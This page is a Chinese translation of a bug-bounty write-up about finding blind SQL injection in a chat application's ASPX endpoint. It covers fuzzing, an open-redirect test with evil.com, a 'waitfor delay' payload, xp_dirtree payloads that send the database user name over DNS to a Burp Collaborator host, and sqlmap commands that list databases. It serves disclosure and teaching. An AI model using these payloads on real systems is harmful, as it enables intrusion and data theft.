<html>
<head>
<title>How a YouTube Video lead to pwning a web application via SQL Injection worth $4324 bounty</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">一个YouTube视频如何通过SQL注入导致价值4324美元奖金网络应用程序</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-a-youtube-video-lead-to-pwning-a-web-application-via-sql-injection-worth-4324-bounty-285f0a9b9f6c?source=collection_archive---------1-----------------------#2022-04-08">https://infosecwriteups.com/how-a-youtube-video-lead-to-pwning-a-web-application-via-sql-injection-worth-4324-bounty-285f0a9b9f6c?source=collection_archive---------1-----------------------#2022-04-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ccb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章是关于我在HackerOne上的一个私人项目中的一个发现。因为这是一个私人项目，所以我做了一些编辑以防止任何敏感信息的泄露。这是我第一次写文章，所以请忽略错误。</p><p id="b850" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以当我被邀请在HackerOne上破解这个私人程序时，我做了一些基本的侦察，包括子域枚举。在使用一些开源工具如AMASS等收集子域名后，我开始逐个查看。在这个过程中，我偶然发现了一个域名，假设它是<code class="fe kl km kn ko b"><strong class="jp ir">chat.example.com</strong></code>。登录页面提供默认的IIS服务器登录页面。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi kp"><img src="../Images/e343694e9b31755b8182f2cb79ad0222.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M7-knbVuX2Nrv3PHpLmOiw.png"/></div></div></figure><p id="b36d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在遇到默认网页后，总有可能会出现一些内容，所以我继续使用我的自定义单词表，通过目录强制对资产进行内容发现。我使用了<code class="fe kl km kn ko b"><strong class="jp ir">ffuf</strong></code>来模糊网络服务器的根目录<code class="fe kl km kn ko b">/</code>，结果我只得到一个目录，假设它是<code class="fe kl km kn ko b"><strong class="jp ir">/vendor-name</strong></code>。在<code class="fe kl km kn ko b"><strong class="jp ir">https://chat.example.com/vendorname/</strong></code> <strong class="jp ir"> </strong>访问应用程序，给出403禁止错误</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lb"><img src="../Images/8d52e3c728c894d6acefba8a40fb9df8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y9tO3HUXH5SgbFjD13NPNg.png"/></div></div></figure><p id="d2f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在遇到错误时，我模糊了<code class="fe kl km kn ko b"><strong class="jp ir">/vendor-name</strong></code>目录，这引导我到另一个成功的目录，假设它是<code class="fe kl km kn ko b"><strong class="jp ir">/software-name</strong></code>，这也给出了一个403禁止错误。Fuzzing <code class="fe kl km kn ko b"><strong class="jp ir">/vendor-name/software-name/</strong></code> endpoint给出了多个类似<code class="fe kl km kn ko b"><strong class="jp ir">/bin,/scripts,/logs,/styles</strong></code>的结果，但没有什么有趣的。看起来非常有趣，但是在这些端点上运行单词列表模糊化并没有产生任何有趣的结果。我尝试了各种扩展<code class="fe kl km kn ko b"><strong class="jp ir">html,aspx,ashx,asp,bak,log</strong></code>，但没有一个工作，它看起来像一个死胡同。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lc"><img src="../Images/90e9f73ca134c52ce8772869a132d46d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*oFYTRNZd8Mg4on_r"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">唐纳德·詹纳蒂在<a class="ae lh" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><p id="3a47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我继续用谷歌搜索前两个目录的名字，因为它们看起来像是<code class="fe kl km kn ko b"><strong class="jp ir">/vendor-name/software-name</strong></code>，所以我用谷歌搜索了<code class="fe kl km kn ko b"><strong class="jp ir">Vendor-Name Software-Name</strong></code>，我得到了一些关于安装在服务器上的软件的结果和信息。这是一个付费聊天/支持软件。之后我在GitHub等网站上搜索。用于应用程序的目录结构，但没有可用的内容。在浏览了多个结果后，我发现了一个供应商制作的<strong class="jp ir"> YouTube </strong>视频，该视频解释了如何安装和配置该应用程序。<strong class="jp ir">由于这是一个关于软件的演示，讲师正在演示配置各种配置文件的方法，因此在视频中，讲师打开了安装服务器的文件夹，当他深入到软件的目录中时，我能够将我的发现与软件的目录结构对应起来。最后，在复制粘贴各种目录/文件并从视频中创建单词表后，我在视频的帮助下找到了一些表格，其中一个是</strong> <code class="fe kl km kn ko b"><strong class="jp ir">https://chat.example.com/vendor-name/software-name/directory1/vulnerableform.html</strong></code>。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi li"><img src="../Images/e31e59266a00dd15c73d606cd850b341.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DybFuTpCYe9hyGmvm7r_nQ.png"/></div></div></figure><p id="49fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在填写完详细信息并点击<code class="fe kl km kn ko b"><strong class="jp ir">Send</strong></code> <strong class="jp ir"> </strong>之后，在发送数据之前，发出了一个类似于<code class="fe kl km kn ko b"><strong class="jp ir">https://chat.example.com/vendor-name/software-name/_randomfiles.aspx?_param1=1&amp;_returnURL=%2Fexample.html</strong> </code>的预先获取请求。这看起来很有趣，所以我尝试查看请求和响应。响应包含一个指向<code class="fe kl km kn ko b"><strong class="jp ir">_returnURL</strong></code>中提到的路径的HTML重定向，所以我试图在<code class="fe kl km kn ko b"><strong class="jp ir">_returnURL</strong></code> <strong class="jp ir"> </strong>中给出<code class="fe kl km kn ko b"><strong class="jp ir">https://evil.com</strong></code>，响应包含一个指向<code class="fe kl km kn ko b"><strong class="jp ir">https://evil.com</strong></code>的HTML重定向，但是像往常一样<strong class="jp ir">打开重定向</strong>在<strong class="jp ir">范围之外</strong>。我试图在URL中插入<code class="fe kl km kn ko b"><strong class="jp ir">javascript:alert(1)</strong></code>,但是它被正确编码了。在此之后，我尝试查看SQL注入漏洞的另一个参数，更改其值对响应没有影响，因此基于错误的SQLI是不可能的，所以我想对该参数尝试一些基本的<strong class="jp ir">盲</strong> <strong class="jp ir"> SQLI </strong>有效负载。在尝试了一些有条件的<strong class="jp ir">盲</strong> <strong class="jp ir"> SQLI </strong>有效载荷以引起一些反应差异或一些错误并且失败后，我试图注入一些<strong class="jp ir">盲</strong> <strong class="jp ir"> SQLI </strong>有效载荷以触发时间延迟。由于它是一台微软服务器，因此后端数据库很可能是支持批处理查询的微软SQL Server，我尝试使用参数上最基本的有效负载(即<code class="fe kl km kn ko b"><strong class="jp ir">waitfor delay'0:0:20'--</strong></code> <strong class="jp ir"> </strong>)的无条件时间延迟来引起一些响应延迟，令我惊讶的是，注入成功了，响应延迟了20秒。有多种方法可以利用盲目的SQL注入，如触发条件响应和带外利用。最常见的方法是让应用程序触发我们控制的系统的带外交互。最常见的方法是使用DNS(域名服务)协议，因为几乎每个组织都允许传出DNS查询，这种情况也是如此。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi li"><img src="../Images/bafab55e35d397ed725be32667618980.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YgbzaxXVScJAv5dhGOCKJw.png"/></div></div></figure><p id="22f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从那以后，一切都是关于谷歌搜索的东西。起初，为了确认漏洞，我使用了<strong class="jp ir"> "xp_dirtree" </strong>一个存储过程，它将尝试列出其第一个参数中给定的目录或网络共享的内容。如果列表是一个网络共享，它将为它做一个<strong class="jp ir"> DNS查找</strong>，如果我们得到一个回调，我们可以确认<strong class="jp ir"> OOB </strong>提取数据是可能的。</p><p id="e1a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> PingBack有效载荷</strong></p><p id="e74c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kl km kn ko b"><strong class="jp ir">;declare @q varchar(99);set @q=’\\[YOU_BURP_COLLAB_SUBDOMAIN_PART_HERE].burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —</strong></code></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lj"><img src="../Images/d84f9544180836b24e454a7267ba3db7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bIS9JydpnuoUI9SUm5fChw.png"/></div></div></figure><p id="3d39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">用户名提取有效负载</strong></p><p id="2a97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kl km kn ko b"><strong class="jp ir">;declare @q varchar(99);set @q=’\\[YOU_BURP_COLLAB_SUBDOMAIN_PART_HERE]’+(SELECT user_name())+’.burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —</strong></code></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lk"><img src="../Images/8b9865f5bcb0a8d7927641837f9d7d3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fcTfgU6vroK4kyq4_kdguA.png"/></div></div></figure><p id="7a3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，手动提取的字符数量是有限的。如果查询结果小于253，包括burp collaborator域，那么只有数据提取是可能的，但这足以对报告进行分类，但为了进一步利用，我使用了<strong class="jp ir"> SQLMAP </strong>，它可以轻松地在我们的<strong class="jp ir"> POC </strong>中提供我们想要的数据。</p><ol class=""><li id="e3a8" class="ll lm iq jp b jq jr ju jv jy ln kc lo kg lp kk lq lr ls lt bi translated"><strong class="jp ir">注射确认</strong></li></ol><p id="efcc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kl km kn ko b"><strong class="jp ir">python3 sqlmap.py -u https://chat.example.com/vendorname/softwarename/_randomfiles.aspx?param1=1</strong></code></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lu"><img src="../Images/3d7f5dbcd4a6b6423f91e8332b973ca2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ub9Iyccxj0iUczOo2Bm6jQ.png"/></div></div></figure><p id="2a96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.<strong class="jp ir">获取数据库</strong></p><p id="37b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kl km kn ko b"><strong class="jp ir">python3 sqlmap.py -u https://chat.example.com/vendorname/softwarename/_randomfiles.aspx?param1=1 — dbs</strong></code></p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi lv"><img src="../Images/7726fa0101c18b4f4080cbdd3b31bd53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jIFKo-eQxVfivxowfGDC3A.png"/></div></div></figure><p id="c6f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在此之后，我创建了包含所有信息的报告，并将其提交给该程序，在HackerOne Triager可以验证该发现之前，该资产已被该程序移除以进行缓解，但HackerOne Triager与该程序确认了这一点，并以<code class="fe kl km kn ko b"><strong class="jp ir">Critical [9.3] </strong></code>严重性对报告进行了分类。缓解后，应用程序启动并安全运行。</p><p id="fa02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">漏洞解决后，我被程序奖励了4324美元的赏金:)</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/df8dad224cb053e3e20c560d96fca410.png" data-original-src="https://miro.medium.com/v2/resize:fit:956/format:webp/1*j2mJnMMhN9_bxscr8rjHAA.png"/></div></figure><p id="4663" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你觉得这个博客很有趣，请分享它，如果你有任何问题，可以在推特上发短信给我，号码是https://twitter.com/k4k4r07。感谢阅读:)</p></div></div>    
</body>
</html>